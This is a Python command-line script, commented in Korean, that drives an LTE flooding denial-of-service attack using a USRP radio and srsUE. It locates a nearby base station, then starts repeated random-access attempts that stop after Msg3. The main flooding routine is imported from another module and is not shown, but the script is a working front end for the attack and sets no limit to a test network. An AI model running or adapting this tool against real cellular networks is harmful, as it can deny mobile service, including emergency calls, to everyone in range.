#!/usr/bin/env python3
"""
LTE Flooding Script - Normal srsUE Demo
일반 srsUE를 사용한 Flooding 공격 시연용 스크립트
"""

import subprocess
import time
import signal
import sys
import os
import re
from typing import Optional
import argparse
import logging
from pathlib import Path

from enb_scout import find_enb
from flooding_attack_normal_ue import run_flooding_attack

# 로깅 설정
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


def check_usrp_connection(usrp_args: Optional[str] = None) -> bool:
    """USRP 장치 연결 확인"""
    logger.info("USRP 장치 연결 확인 중...")
    
    try:
        result = subprocess.run(
            ["uhd_find_devices"],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        serial_match = re.search(r'serial:\s*([^\s,]+)', result.stdout + result.stderr)
        if serial_match:
            found_serial = serial_match.group(1)
            user_serial = None
            if usrp_args:
                user_serial_match = re.search(r'serial=([^\s"]+)', usrp_args)
                user_serial = user_serial_match.group(1) if user_serial_match else None
            
            if user_serial and found_serial.upper() == user_serial.upper():
                logger.info(f"✓ USRP 장치 연결 확인됨: serial={found_serial}")
                return True
            elif not user_serial:
                logger.info(f"✓ USRP 장치 연결 확인됨: serial={found_serial}")
                return True
        
        logger.warning("USRP 장치를 찾을 수 없습니다.")
        return False
    except FileNotFoundError:
        logger.warning("uhd_find_devices 명령어를 찾을 수 없습니다. USRP 연결 확인을 건너뜁니다.")
        return True
    except Exception as e:
        logger.warning(f"USRP 연결 확인 중 오류: {e}")
        return True


class LTEFlooderNormal:
    """일반 srsUE를 사용한 LTE Flooding 공격 클래스"""
    
    def __init__(self, usrp_args: Optional[str] = None,
                 mcc: Optional[int] = None, mnc: Optional[int] = None,
                 earfcn: Optional[int] = None, template_config: str = "ue_template.conf",
                 srsue_path: Optional[str] = None):
        self.usrp_args = usrp_args
        self.mcc = mcc
        self.mnc = mnc
        self.earfcn = earfcn
        self.template_config = template_config
        self.srsue_path = srsue_path
        self.running = False
    
    def start(self):
        """Flooding 공격 시작"""
        if self.running:
            logger.warning("이미 실행 중입니다.")
            return
        
        # USRP 연결 확인
        if not check_usrp_connection(self.usrp_args):
            logger.error("USRP 장치 연결 확인 실패")
            return
        
        # eNB 탐색
        logger.info(f"eNB 탐색 중... (사용하는 config: {self.template_config})")
        enb_found = find_enb(
            usrp_args=self.usrp_args,
            config_path=self.template_config,
            earfcn=self.earfcn
        )
        
        if not enb_found:
            logger.error("eNB를 찾을 수 없습니다.")
            return
        
        logger.info("✓ eNB를 찾았습니다!")
        logger.info("일반 srsUE를 사용한 Flooding 공격 시작...")
        logger.info("(Msg3 전송 후 프로세스 종료, Msg4/Msg5는 무시)")
        
        self.running = True
        
        # Flooding 공격 실행
        try:
            run_flooding_attack(
                template_config=self.template_config,
                usrp_args=self.usrp_args,
                running_flag=lambda: self.running,
                mcc=self.mcc,
                mnc=self.mnc,
                earfcn=self.earfcn,
                usim_opc=os.getenv("USIM_OPC"),
                usim_k=os.getenv("USIM_K"),
                srsue_path=self.srsue_path
            )
        except KeyboardInterrupt:
            logger.info("\n종료 신호 수신...")
        finally:
            self.running = False
            logger.info("LTE Flooding이 중지되었습니다.")
    
    def stop(self):
        """Flooding 공격 중지"""
        self.running = False


def main():
    parser = argparse.ArgumentParser(
        description="LTE Flooding (Normal srsUE) - 일반 srsUE를 사용하여 시연"
    )
    
    parser.add_argument(
        "--usrp-args",
        type=str,
        help="USRP 장치 인자 (예: type=b200,serial=YOUR_SERIAL)"
    )
    
    parser.add_argument(
        "--mcc",
        type=int,
        help="Mobile Country Code (기본값: 자동)"
    )
    
    parser.add_argument(
        "--mnc",
        type=int,
        help="Mobile Network Code (기본값: 자동)"
    )
    
    parser.add_argument(
        "--earfcn",
        type=int,
        help="EARFCN (주파수 채널 번호, 기본값: 자동 스캔)"
    )
    
    parser.add_argument(
        "--template-config",
        type=str,
        default="ue_template.conf",
        help="템플릿 UE config 파일 경로 (기본값: ue_template.conf)"
    )
    
    parser.add_argument(
        "--srsue-path",
        type=str,
        default="srsue",
        help="일반 srsue 바이너리 경로 (기본값: srsue, PATH에서 찾음)"
    )
    
    args = parser.parse_args()
    
    # srsue 경로 확인
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    if args.srsue_path and not os.path.isabs(args.srsue_path):
        # 상대 경로면 현재 디렉토리나 PATH에서 찾기
        if not os.path.exists(args.srsue_path):
            # PATH에서 찾기
            import shutil
            srsue_in_path = shutil.which("srsue")
            if srsue_in_path:
                args.srsue_path = srsue_in_path
                logger.info(f"srsue 바이너리 찾음: {args.srsue_path}")
            else:
                logger.error("srsue 바이너리를 찾을 수 없습니다. --srsue-path 옵션을 지정하세요.")
                sys.exit(1)
    
    if not os.path.exists(args.srsue_path):
        logger.error(f"srsue 바이너리를 찾을 수 없습니다: {args.srsue_path}")
        sys.exit(1)
    
    logger.info("=" * 60)
    logger.info("LTE Flooding Attack (Normal srsUE Demo)")
    logger.info("=" * 60)
    logger.info(f"설정: 주파수: EARFCN {args.earfcn if args.earfcn else '자동 스캔'}, "
                f"MCC: {args.mcc if args.mcc else '자동'}, "
                f"MNC: {args.mnc if args.mnc else '자동'}")
    logger.info(f"템플릿 config: {args.template_config}")
    logger.info(f"srsue 경로: {args.srsue_path}")
    logger.info(f"USRP 인자: {args.usrp_args if args.usrp_args else '없음'}")
    logger.info("=" * 60)
    
    # 시그널 핸들러 설정
    flooder = LTEFlooderNormal(
        usrp_args=args.usrp_args,
        mcc=args.mcc,
        mnc=args.mnc,
        earfcn=args.earfcn,
        template_config=args.template_config,
        srsue_path=args.srsue_path
    )
    
    def signal_handler(sig, frame):
        logger.info("\n종료 신호 수신...")
        flooder.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Flooding 공격 시작
    flooder.start()


if __name__ == "__main__":
    main()

